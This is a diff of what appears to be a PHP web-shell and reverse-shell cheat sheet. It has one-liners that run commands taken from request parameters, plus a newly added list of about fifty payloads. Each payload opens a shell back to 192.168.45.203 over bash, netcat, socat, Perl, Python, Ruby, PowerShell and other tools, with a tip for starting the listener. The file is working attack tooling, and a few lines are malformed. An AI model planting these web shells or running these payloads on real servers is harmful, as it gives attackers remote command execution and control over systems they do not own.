@@ -2,12 +2,62 @@
 <?php system($_REQUEST['cmd']); ?>  #Run comaands using cmd
 <?php system('uname -a'); ?>
 <?php system('id'); ?>
-<?php system("bash -i >& /dev/tcp/192.168.0.0/8888 0>&1");?>
-<?php system("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.0.0/80 0<&1 2>&1'"); ?>
-
 <?php echo passthru($_GET['cmd']); ?>
 <?php echo exec($_POST['cmd']); ?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_REQUEST['cmd']); ?>
 
+
+# Reverse Shell - (Test with "nc -lvnp 80" or "rlwrap nc -lvnp 80" for stability) - (Some require tools: nc, socat, perl, python, etc. — check target.)
+<?php system("bash -i >& /dev/tcp/192.168.0.0/8888 0>&1");?>
+<?php system("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.0.0/80 0<&1 2>&1'"); ?>
 <?php shell_exec("/bin/bash -c \'/bin/bash -i >& /dev/tcp/192.168.0.0/8888 0>&1\'");?>
+<?php shell_exec("/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.203/80 0>&1'"); ?>
+<?php system("bash -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php system("/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.45.203/80 0<&1 2>&1'"); ?>
+<?php passthru("bash -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php exec("bash -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php `bash -i >& /dev/tcp/192.168.45.203/80 0>&1`; ?>
+<?php shell_exec("sh -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php system("sh -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php passthru("sh -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php exec("sh -i >& /dev/tcp/192.168.45.203/80 0>&1"); ?>
+<?php `sh -i >& /dev/tcp/192.168.45.203/80 0>&1`; ?>
+<?php shell_exec("nc -e /bin/sh 192.168.45.203 80"); ?>
+<?php system("nc -e /bin/sh 192.168.45.203 80"); ?>
+<?php passthru("nc -e /bin/sh 192.168.45.203 80"); ?>
+<?php exec("nc -e /bin/sh 192.168.45.203 80"); ?>
+<?php shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.203 80 >/tmp/f"); ?>
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.203 80 >/tmp/f"); ?>
+<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.203 80 >/tmp/f"); ?>
+<?php shell_exec("mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.45.203 80 1>/tmp/p"); ?>
+<?php system("mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.45.203 80 1>/tmp/p"); ?>
+<?php shell_exec("php -r '\$sock=fsockopen(\"192.168.45.203\",80);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"); ?>
+<?php system("php -r '\$sock=fsockopen(\"192.168.45.203\",80);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"); ?>
+<?php shell_exec("perl -e 'use Socket;\$i=\"192.168.45.203\";\$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"); ?>
+<?php system("perl -e 'use Socket;\$i=\"192.168.45.203\";\$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"); ?>
+<?php shell_exec("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.203\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"); ?>
+<?php system("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.203\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"); ?>
+<?php shell_exec("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.203\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'"); ?>
+<?php shell_exec("ruby -rsocket -e 'f=TCPSocket.open(\"192.168.45.203\",80).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"); ?>
+<?php system("ruby -rsocket -e 'f=TCPSocket.open(\"192.168.45.203\",80).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"); ?>
+<?php shell_exec("lua -e \"s=require('socket');c=s.connect('192.168.45.203',80);while true do l=c:receive();f=io.popen(l,'r');d=f:read('*a');f:close();c:send(d);end\""); ?>
+<?php shell_exec("telnet 192.168.45.203 80 | /bin/sh | telnet 192.168.45.203 80"); ?>
+<?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.203/80 0>&1 &'"); ?>
+<?php passthru("bash -c 'bash -i >& /dev/tcp/192.168.45.203/80 0>&1 &'"); ?>
+<?php shell_exec("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.203:80"); ?>
+<?php system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.203:80"); ?>
+<?php shell_exec("awk 'BEGIN {s = \"/inet/tcp/0/192.168.45.203/80\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"); ?>
+<?php shell_exec("expect -c 'spawn sh; set timeout -1; expect \"*#\"; send \"/bin/sh -i >& /dev/tcp/192.168.45.203/80 0>&1\\r\"; interact'"); ?>
+<?php shell_exec("zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.45.203 80 && zsh >&$REPLY 2>&$REPLY 0&$REPLY'"); ?>
+<?php shell_exec("ksh -c 'ksh -i >& /dev/tcp/192.168.45.203/80 0>&1'"); ?>
+<?php shell_exec("csh -b '& /dev/tcp/192.168.45.203/80 0>&1'"); ?>
+<?php shell_exec("tclsh -c 'set s [socket 192.168.45.203 80]; while 1 { puts -nonewline $s \"shell> \"; flush $s; gets $s c; if {$c eq \"exit\"} break; set r [eval $c]; puts $s $r }'"); ?>
+<?php shell_exec("node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{stdio:[\"pipe\",process.openStdin(),process.openStdout()]}).stdin.pipe(require(\"net\").connect(80,\"192.168.45.203\"))'"); ?>
+<?php shell_exec("powershell -nop -c \"\$client = New-Object System.Net.Sockets.TCPClient('192.168.45.203',80);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""); ?>
+<?php $sock = fsockopen("192.168.45.203", 80); exec("/bin/sh -i <&3 >&3 2>&3"); ?>
+<?php $proc = proc_open("/bin/sh -i", array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w")), $pipes); $sock = fsockopen("192.168.45.203", 80); stream_copy_to_stream($pipes[1], $sock); ?>
+<?php shell_exec("bash -i 5<> /dev/tcp/192.168.45.203/80 0<&5 1>&5 2>&5"); ?>
+<?php system("bash -i 5<> /dev/tcp/192.168.45.203/80 0<&5 1>&5 2>&5"); ?>
+<?php shell_exec("ncat --udp 192.168.45.203 80 -e /bin/sh"); ?>
+<?php shell_exec("curl -X POST -d @/dev/stdin http://192.168.45.203:80/shell --data-urlencode 'bash -i >& /dev/tcp/192.168.45.203/80 0>&1'"); ?>
